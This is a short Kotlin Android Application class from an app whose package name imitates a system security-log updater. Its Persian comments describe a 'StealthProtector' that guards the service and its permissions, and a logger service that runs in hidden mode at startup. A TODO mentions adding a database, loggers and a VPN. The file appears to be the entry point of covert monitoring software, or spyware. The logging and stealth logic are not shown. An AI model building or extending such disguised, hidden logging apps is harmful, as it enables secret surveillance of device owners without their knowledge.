package com.android.seclogupd.core

import android.app.Application
import android.content.Intent
import android.os.Build
import com.android.seclogupd.protect.StealthProtector
import com.android.seclogupd.service.LoggerService
import com.android.seclogupd.util.DebugNotifier

class App : Application() {
    override fun onCreate() {
        super.onCreate()

        // اجرای محافظت کلی روی سرویس و دسترسی‌ها
        StealthProtector.init(this)

        DebugNotifier.show(this, "LoggerClient", "App.kt started")

        // اجرای سرویس لاگر در حالت مخفی (foreground service از LoggerService)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(Intent(this, LoggerService::class.java))
        } else {
            startService(Intent(this, LoggerService::class.java))
        }
        DebugNotifier.show(this, "LoggerClient", "LoggerService launched")
        // TODO: سایر initializations: database, loggers, VPN, ...
    }
}
